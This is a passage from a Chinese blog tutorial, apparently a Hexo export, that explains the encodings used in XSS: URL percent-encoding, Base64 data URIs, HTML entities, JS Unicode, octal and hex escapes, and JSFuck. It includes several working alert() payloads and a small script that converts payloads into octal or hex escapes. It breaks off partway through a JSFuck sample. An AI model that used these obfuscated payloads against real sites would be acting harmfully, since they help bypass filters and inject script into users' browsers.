browsers](http://taligarsiel.com/Projects/howbrowserswork1.htm)\n\n现在再来看看开头提到的混合编码：\n```html\n<html>\n<body>\n    <a href=\"javascript:ShowSomething('&#37&#53&#99&#37&#55&#56&#37&#51&#52&#37&#51&#49');\">click</a>\n</body>\n<script>\n    function ShowSomething(x){\n        alert(x);\n    }\n</script>\n</html>\n```\n页面加载时，会把 a 标签中的 HTML 实体编码做解码。  \n当点击「click」时，先把 href 的内容当作整体做 URL 解码。  \n最后因为 javascript 伪协议，把其中的 8进制转义字符做解码。  \n至于每一步，由什么转成什么，就不用我说了吧：）\n### 后记\n本篇的目的在于科普基础的编码，为了让非科班出身的朋友看起来不那么晦涩，理论知识介绍较少。  \n但这不代表理论知识不重要，我的初衷是希望大家能把我的例子拿出来修修改改，尝试不同的可能。在摸索中遇到疑惑，然后自己解决困惑，渐渐积累起一定的概念后，会有想知道原理的冲动。相信这个时候，你积累的东西已经能让你阅读通顺了。  \n写这篇文章的过程中，自己也查阅了很多的文章与维基百科，写了大量的测试代码来验证想法和探究原理，与老司机交流解惑。但最后只把其中比较直观的拿出来当作例子。后面再写写一些我了解到的姿势和一些需要搞清楚的原理性知识点也说不定（上面的那篇 How browsers work 中有此类知识点）。  \n不过到时候你可能已经比我强了，记得带带我：）\n","slug":"xss_charset","published":1,"updated":"2017-09-29T08:56:29.000Z","photos":[],"link":"","_id":"cjh9h0k8i000rmkwb2ngeya01","content":"<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=\"330\" height=\"86\" src=\"//music.163.com/outchain/player?type=2&id=786262&auto=0&height=66\"></iframe>\n\n<blockquote>\n<p>记得那天，Windows xp 桌面上的天很蓝。<br>这是第几次远远的望着已经记不清了，走上前试试看吧。<br>我表现的不是很熟络，交谈的过程却出奇的愉快，好感度的 Level 似乎在不经意间也升了几级。<br>伴随着逐渐深入的交流，难免会擦出些共鸣的火花。<br>我是个对待这种事情比较认真的人。<br><a id=\"more\"></a>了解的时候，走走心就好了。<br>真到了认定了的时候，再走……走四方，路迢……<br><br>可能那一天来的快了些，仓促间暴露出了还没准备好的胆怯。<br>不知道有没有被看到，不过想想也却是没什么丢人的。<br>说来也不怕笑话，平时会刻意让自己多留意一些有关体位的姿势。<br>在得到“请开始你的表演”的暗示时，脑海中的各种体位交错在一起，心还不争气的砰砰跳个不停。<br>这短暂的瞬间突然很慌张，毕竟没有实际操作的经验，这些体位有没有效果我心里也没底。<br><br>我动起来的那一刻，我完全不知道下一秒会得到什么样的反应。<br>毕竟是个没有经验的年轻人，当发现没有回应的时候，内心那个轻声呢喃的质疑声现在都还记得。<br>有点慌张，还有些不知所措。<br>不知从哪里涌出来的不甘让我顾不及反应如何就把脑中的体位一个接一个的用了出来。<br>渐渐的有了回应，因某些姿势恰到好处弹出回应的 body 给了我一些信心。<br>可有时任凭我姿势如何，那依然沉寂的如没有音乐的骨灰盒的 body，却成了挥不去的阴影。<br><br>那天事后，我点了支烟。<br>脑海中回忆着前一刻自己操作的慌张，眼神透过迷蒙的烟雾望着前方。<br>我想通了一件事情。<br>XSS 这样各种编码瞎特么插，迟早药丸。</p>\n</blockquote>\n<hr>\n<p>前几天有人看了我前面的博客后问我「什么样的情况下使用什么编码方式?」<br>当时我就扇了自己一嘴巴子，确实心路历程描述的不够饱满……</p>\n<h3 id=\"正文之前\"><a href=\"#正文之前\" class=\"headerlink\" title=\"正文之前\"></a>正文之前</h3><p>编码这件事如果瞎j8操作那真是犹如「加藤老师扣人嘴」，还是写一写吧。便有了这篇。</p>\n<p>其实该使用什么编码插入，要根据实际情况而定，单一的编码，混合编码都有可能。重要的是清楚<strong>哪种编码</strong>在<strong>哪个时刻</strong>被<strong>哪种规则</strong>解析。 </p>\n<p>简单点来说就是：URL 请求时会对百分号等 URL 的编码方式进行转码；浏览器接收到页面数据后，会对 HTML 实体编码进行转码；执行 JS 时会对 JSUnicode 等 JS 支持的方式进行转码。</p>\n<p>复合编码的情况稍微复杂了些，比如这样：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"javascript:ShowSomething('&amp;#37&amp;#53&amp;#99&amp;#37&amp;#55&amp;#56&amp;#37&amp;#51&amp;#52&amp;#37&amp;#51&amp;#49');\"</span>&gt;</span>click<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"></span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ShowSomething</span>(<span class=\"params\">x</span>)</span>&#123;</div><div class=\"line\">        alert(x);</div><div class=\"line\">    &#125;</div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>这个例子中，从浏览器开始加载页面到你点击「click」弹出内容，<code>ShowSomething()</code> 的参数经过了三次转码。</p>\n<p>如果看不懂上面的例子没关系，等看完这篇文章，你还是看不懂上面的例子，再跳楼也不迟：）</p>\n<p>好进入正题前先说明（anli）一下：<br>下文中不会刻意说明某些字符转码前后分别是什么，大家请自行对照。<br>如果有转码需求，可以使用 Cos 他们这个开源工具 「<a href=\"http://xssor.io/\" target=\"_blank\" rel=\"external\">xssor.io</a>」 自行转码。  </p>\n<p>另外，本篇会面向基础薄弱的读者。会写的相对浅显，例如不会提及 <code>DOM</code> 、 <code>JS 解释器</code> 等这类需要一定知识积累的概念。老司机可以下车了～</p>\n<h3 id=\"URL-编码\"><a href=\"#URL-编码\" class=\"headerlink\" title=\"URL 编码\"></a>URL 编码</h3><p>这里要说的 URL 编码指的是 <strong>URI 的百分号编码</strong>。<br>我们在进行 URL 请求时，浏览器会自动帮我们把部分符号转换成 <code>&#39;%&#39; + &#39;十六进制数字&#39;</code> 的形式，用 windows 时间长的朋友们可能会遇见自己的安装软件时显示的路径中有一些<code>字符</code>或者<code>中文</code>会被显示为这种形式。   </p>\n<p>服务器接收到提交来的请求时，会先把 <code>%</code> 编码转换成正常的字符。<br>我们借助一个简单的 php web 应用来说明这个问题，代码很简单：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt; <span class=\"attr\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">' \"URL 请 求：\" + location.search.substr(1) +</span></span></div><div class=\"line\">                \"\\n\" + </div><div class=\"line\">                \"服务器接受：\" + \"&lt;?php echo '<span class=\"attr\">para</span>=<span class=\"string\">'.$_GET['</span><span class=\"attr\">para</span>']?&gt;\"</div><div class=\"line\">            );'</div><div class=\"line\">    &gt;click<span class=\"tag\">&lt;/ <span class=\"attr\">a</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>上面这段代码可以自己放到自己的服务器上试一下。<br>当我们带着这样的参数请求时：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://www.xxx.com/xxx.php?para=%3Cscript%3E%61lert();%3C/script%3E</div></pre></td></tr></table></figure></p>\n<p><img src=\"/Image/url_encode.png\" alt=\"url_encode\"></p>\n<p>从 <code>alert()</code> 的内容和 Chrome 的控制台都能看出我们的「百分号编码」被转义为正常内容了。<br>其中 <code>alert()</code> 中的 <code>a</code> 被我转成了 <code>%61</code>，想说明除了符号，数字和字母也是可以做转换的。</p>\n<p>URL 这里其实还有一种 <strong>Base64</strong> 编码, 常用来做简单加密传输数据。<br>比如我们在 「<a href=\"http://xssor.io/\" target=\"_blank\" rel=\"external\">xssor.io</a>」 中使用 「Base64EN」转换下面的代码<br><code>&lt;script&gt;alert(/xss/);&lt;/script&gt;</code> 得到： <code>PHNjcmlwdD5hbGVydCgveHNzLyk7PC9zY3JpcHQ+</code><br>我们可以这样试试效果：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk7PC9zY3JpcHQ+\"</span>&gt;</span>XSS<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>点击链接后，就会通过 data 协议去加载后面的内容。其中，如果声明了 Base64 的话，就会做相应的 Base64 解码操作。对了，这个例子在 Chrome 里会被拦截，点击没反应的话，按 F12 你会看到红色的警告，控制台里点击一下链接就看到效果了。<br>其实还有……这里就不讲了。想拓展的可以去 「<a href=\"http://xssor.io/\" target=\"_blank\" rel=\"external\">xssor.io</a>」看看上面都有什么，这也是一种学习方式：）。</p>\n<h3 id=\"HTML-实体编码\"><a href=\"#HTML-实体编码\" class=\"headerlink\" title=\"HTML 实体编码\"></a>HTML 实体编码</h3><p>有些时候，我们想在页面上显示的东西会跟 HTML 本身的标记冲突。<br>比如我们只想在页面中显示 <code>&lt;script&gt;alert();&lt;/script&gt;</code> 而不是执行这串代码的时候，我们如下这样写是不行的：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">alert();</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>其中的 <code>&lt;script&gt;alert();&lt;/script&gt;</code> 会被当作 JS 脚本进行解析。<br>但如果我们把这些字符用另一种方式表示，只要不出现类似 <code>&lt;script&gt;</code> 这种内容的话，问题似乎就解决了。<br>HTML 编码就是用来解决这件事情的，我们的 ‘&lt;’ 字符可以用 HTML编码中的 <code>&amp;lt;</code> 来表示。<br>那我们的代码可以变成：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></div><div class=\"line\">    &amp;lt;scirpt&gt;alert();&amp;lt;/script&gt;</div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>上面的代码可以自己拷贝出来，保存到文本文件，起名 xxx.html 然后用浏览器打开试试看。<br>上面用到的是 <code>&#39;&amp;&#39; + &#39;约定名称&#39; + &#39;;&#39;</code> 的形式，其实还有 <code>&#39;&amp;#&#39; + &#39;十进制数字&#39; + &#39;;&#39;</code> 和 <code>&#39;&amp;#x&#39; + &#39;十六进制数字&#39; + &#39;;&#39;</code> 的形式。比如上文的 <code>&#39;&lt;&#39;</code> 这个字符可以表示为 <code>&amp;#0060;</code> 和 <code>&amp;#x003c;</code>。<br>其中约定名称是为了便于记忆，后面的十进制和十六进制编码中 <code>#</code> 后面的连续的零多几个或者少几个都可以，类似<code>1</code>和<code>00001</code>的数值是相等的感觉。  </p>\n<p>我们都知道这样是可以触发弹窗的（不知道的话，要自行补一补哦）：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">''</span> <span class=\"attr\">onerror</span>=<span class=\"string\">'alert();'</span>/&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>我们还可以应用 HTML 实体编码这样：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">''</span> <span class=\"attr\">onerror</span>=<span class=\"string\">'&amp;#97;lert&amp;#40;&amp;#41;&amp;#59'</span>/&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>但有个要求：HTML 实体编码不能干扰到标签自身的属性和声明性内容。<br>比如：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">im&amp;#103;</span> <span class=\"attr\">src</span>=<span class=\"string\">''</span> <span class=\"attr\">onerror</span>=<span class=\"string\">'alert();'</span>/&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">sr</span>&amp;#<span class=\"attr\">99</span>;=<span class=\"string\">''</span> <span class=\"attr\">onerror</span>=<span class=\"string\">'alert();'</span>/&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>都是不行的。</p>\n<p>关于 HTML 实体编码，十进制与十六进制编码后面的 ‘;’ 是可以省略的。</p>\n<h3 id=\"JS-编码\"><a href=\"#JS-编码\" class=\"headerlink\" title=\"JS 编码\"></a>JS 编码</h3><p>到这里，可能大家面对各种编码已经比较淡定了，不就是不同的编码规则嘛。<br>首先说说 JS Unicode 编码<br>规则是 <code>&#39;\\u&#39; + &#39;四位十六进制数字&#39;</code> 不够四位前面补0。<br>我们来看看例子（通过 「<a href=\"http://xssor.io/\" target=\"_blank\" rel=\"external\">xssor.io</a>」转码）：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"></span></div><div class=\"line\">    <span class=\"comment\">//进行 JS Unicode 转码前的样子：</span></div><div class=\"line\">    <span class=\"comment\">//document.body.innerHTML=\"&lt;img src='' onerror='alert(/xss/)'/&gt;\";</span></div><div class=\"line\">    <span class=\"built_in\">document</span>.body.innerHTML=<span class=\"string\">\"\\u003c\\u0069\\u006d\\u0067\\u0020\\u0073\\u0072\\u0063\\u003d\\u0027\\u0027\\u0020\\u006f\\u006e\\u0065\\u0072\\u0072\\u006f\\u0072\\u003d\\u0027\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u002f\\u0078\\u0073\\u0073\\u002f\\u0029\\u0027\\u002f\\u003e\"</span>;</div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>这段代码在执行 innerHTML 操作前，因为字符串符合 Unicode 编码规则，会被先解码再输出。<br>另外，也可以这样玩：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"></span></div><div class=\"line\">    \\u0061lert(<span class=\"regexp\">/xss/</span>);</div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>好，下面说说 「8进制」和「16进制」的转义字符。<br>「8进制」由 <code>&#39;\\&#39; + &#39;8进制数字&#39;</code> 组成。<br>「16进制」由 <code>&#39;\\x&#39; + &#39;16进制数字&#39;</code> 组成。  </p>\n<p>我们来看看例子。  额……嗯……<br>「<a href=\"http://xssor.io/\" target=\"_blank\" rel=\"external\">xssor.io</a>」上并没有直接提供这两种转码功能……  在网上简单搜索了一下，没找到什么合适的。<br>「卧槽，没有地方能转怎么办？」『<strong>自己写啊</strong>』  </p>\n<h4 id=\"自己写一个「定制版转换工具」\"><a href=\"#自己写一个「定制版转换工具」\" class=\"headerlink\" title=\"自己写一个「定制版转换工具」\"></a>自己写一个「定制版转换工具」</h4><p>其实自己写的难度不大，为什么这么说？因为 「<a href=\"http://xssor.io/\" target=\"_blank\" rel=\"external\">xssor.io</a>」 已经实现了 10进制 与 16进制 的 encode、decode功能。<br>嗯，我们去「借鉴一下」。</p>\n<p>通过项目的页面代码，我们能能够找到我们需要的代码所在位置：<br><img src=\"/Image/xssor_github_ende.png\" alt=\"xssor_github_ende\"></p>\n<p>在页面的文件中找到对应方法，看具体实现：<br><img src=\"/Image/xssor_github_ende_function.png\" alt=\"xssor_github_ende_function\"></p>\n<p>作为一个老司机，最重要的还是「心中无码」，我们只要看它的实现思想就好。<br>核心思想是通过 <code>charCodeAt()</code> 把我们输入的内容转成 Unicode 编码的数字，然后使用 <code>toString(x)</code> 再转成对应 x 进制的数字，然后定制我们的样式。<br>下面来根据我们的需求，定制我们自己的代码：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;html&gt;</div><div class=\"line\"><span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></div><div class=\"line\">&lt;script&gt;</div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">xss_js_to8or16</span>(<span class=\"params\">x, txt</span>)</span>&#123;</div><div class=\"line\">        <span class=\"keyword\">var</span> _a=<span class=\"string\">\"\"</span>;</div><div class=\"line\">        <span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>; i&lt;txt.length; i++)&#123;</div><div class=\"line\">            <span class=\"comment\">// 这里用到了三目运算符。如果不知道自行充能哦。</span></div><div class=\"line\">            s = txt.charCodeAt(i).toString(x == <span class=\"number\">8</span> ? <span class=\"number\">8</span> : <span class=\"number\">16</span>);</div><div class=\"line\">            <span class=\"comment\">// '\\\\' 转义后变为 '\\'   </span></div><div class=\"line\">            _a += (x == <span class=\"number\">8</span> ? <span class=\"string\">\"\\\\\"</span> : <span class=\"string\">\"\\\\x\"</span>) + s;</div><div class=\"line\">        &#125;</div><div class=\"line\">        <span class=\"keyword\">return</span> _a;</div><div class=\"line\">    &#125;</div><div class=\"line\">    <span class=\"keyword\">var</span> str = <span class=\"string\">\"&lt;img src='' onerror='alert(/xss/)'/&gt;\"</span>;</div><div class=\"line\">    <span class=\"built_in\">console</span>.log(xss_js_to8or16(<span class=\"number\">8</span>, str));</div><div class=\"line\">    <span class=\"built_in\">console</span>.log(xss_js_to8or16(<span class=\"number\">16</span>, str));</div><div class=\"line\"><span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></div><div class=\"line\">&lt;<span class=\"regexp\">/html&gt;</span></div></pre></td></tr></table></figure></p>\n<p>好了，我们把代码保存为 <code>xx.html</code> ，并通过浏览器打开，F12 下看 Console 标签内的内容，就是我们想要的 8进制 与 16进制的内容了。</p>\n<p>把拿到的字符串放入我们的例子中，8进制：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"></span></div><div class=\"line\">    <span class=\"comment\">//进行 JS Unicode 转码前的样子：</span></div><div class=\"line\">    <span class=\"comment\">//document.body.innerHTML=\"&lt;img src='' onerror='alert(/xss/)'/&gt;\";</span></div><div class=\"line\">    <span class=\"built_in\">document</span>.body.innerHTML=<span class=\"string\">\"\\74\\151\\155\\147\\40\\163\\162\\143\\75\\47\\47\\40\\157\\156\\145\\162\\162\\157\\162\\75\\47\\141\\154\\145\\162\\164\\50\\57\\170\\163\\163\\57\\51\\47\\57\\76\"</span>;</div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>16进制：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"></span></div><div class=\"line\">    <span class=\"comment\">//进行 JS Unicode 转码前的样子：</span></div><div class=\"line\">    <span class=\"comment\">//document.body.innerHTML=\"&lt;img src='' onerror='alert(/xss/)'/&gt;\";</span></div><div class=\"line\">    <span class=\"built_in\">document</span>.body.innerHTML=<span class=\"string\">\"\\x3c\\x69\\x6d\\x67\\x20\\x73\\x72\\x63\\x3d\\x27\\x27\\x20\\x6f\\x6e\\x65\\x72\\x72\\x6f\\x72\\x3d\\x27\\x61\\x6c\\x65\\x72\\x74\\x28\\x2f\\x78\\x73\\x73\\x2f\\x29\\x27\\x2f\\x3e\"</span>;</div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>如果你仔细观察下，会发现， JS 8进制编码的长度要短一些，如果遇到插入长度有所限制的情况就可以用到这个特点。<br>还有一种叫做 <a href=\"http://www.jsfuck.com/\" target=\"_blank\" rel=\"external\">JSFuck</a> 的编码，长什么样呢？<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+(![]+[+![]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])